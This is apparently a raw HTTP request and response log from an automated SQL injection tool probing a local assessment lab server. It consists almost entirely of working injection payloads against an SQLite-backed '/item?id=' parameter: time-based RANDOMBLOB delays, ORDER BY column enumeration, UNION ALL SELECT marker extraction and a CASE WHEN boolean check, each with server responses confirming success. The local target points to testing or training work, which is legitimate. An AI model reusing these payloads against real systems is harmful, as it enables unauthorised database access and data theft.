+HTTP response [#44] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:55 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28000000000%2F2%29%29%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#45]:
+GET /item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#45] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#46]:
+GET /item?id=1%20ORDER%20BY%201--%20dxOZ HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#46] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%201--%20dxOZ
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#47]:
+GET /item?id=1%20ORDER%20BY%204737--%20ebUT HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#47] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%204737--%20ebUT
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#48]:
+GET /item?id=1%20ORDER%20BY%2010--%20dpys HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#48] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%2010--%20dpys
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#49]:
+GET /item?id=1%20ORDER%20BY%206--%20eila HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#49] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%206--%20eila
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#50]:
+GET /item?id=1%20ORDER%20BY%204--%20XAYo HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#50] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%204--%20XAYo
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#51]:
+GET /item?id=1%20ORDER%20BY%203--%20ruQl HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#51] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%203--%20ruQl
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#52]:
+GET /item?id=1%20ORDER%20BY%202--%20nEOn HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#52] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: text/plain
+Content-Length: 72
+URI: http://127.0.0.1:18080/item?id=1%20ORDER%20BY%202--%20nEOn
+
+SQLite error: 1st ORDER BY term out of range - should be between 1 and 1
+
+############################################################################
+
+HTTP request [#53]:
+GET /item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20ikFj HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#53] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 67
+URI: http://127.0.0.1:18080/item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20ikFj
+
+[["alpha"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"]]
+
+############################################################################
+
+HTTP request [#54]:
+GET /item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%2879%2C121%2C75%2C80%2C110%2C79%2C83%2C110%2C67%2C99%2C71%2C118%2C77%2C98%2C102%2C78%2C75%2C80%2C74%2C116%2C84%2C82%2C99%2C78%2C99%2C110%2C119%2C79%2C115%2C67%2C113%2C75%2C78%2C102%2C66%2C121%2C111%2C73%2C68%2C118%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20vXoZ HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#54] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 123
+URI: http://127.0.0.1:18080/item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%2879%2C121%2C75%2C80%2C110%2C79%2C83%2C110%2C67%2C99%2C71%2C118%2C77%2C98%2C102%2C78%2C75%2C80%2C74%2C116%2C84%2C82%2C99%2C78%2C99%2C110%2C119%2C79%2C115%2C67%2C113%2C75%2C78%2C102%2C66%2C121%2C111%2C73%2C68%2C118%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20vXoZ
+
+[["alpha"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqOyKPnOSnCcGvMbfNKPJtTRcNcnwOsCqKNfByoIDvqjbkq"]]
+
+############################################################################
+
+HTTP request [#55]:
+GET /item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29%20FROM%20%28SELECT%200%20AS%20rVDP%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20RRbl--%20qZUA HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#55] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 851
+URI: http://127.0.0.1:18080/item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7CCHAR%28108%2C117%2C120%2C86%2C122%2C121%2C87%2C79%2C110%2C105%2C79%2C108%2C66%2C117%2C114%2C120%2C68%2C88%2C87%2C104%2C100%2C112%2C86%2C66%2C119%2C83%2C117%2C76%2C90%2C107%2C76%2C115%2C79%2C114%2C105%2C66%2C82%2C113%2C101%2C80%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29%20FROM%20%28SELECT%200%20AS%20rVDP%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20RRbl--%20qZUA
+
+[["alpha"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"], ["qqqkqluxVzyWOniOlBurxDXWhdpVBwSuLZkLsOriBRqePqjbkq"]]
+
+############################################################################
+
+HTTP request [#56]:
+GET /item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288927%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%208927%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20HGFB HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#56] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:56 GMT
+Content-Type: application/json
+Content-Length: 28
+URI: http://127.0.0.1:18080/item?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288927%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%208927%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29--%20HGFB
+
+[["alpha"], ["qqqkq1qjbkq"]]
+
+############################################################################
+
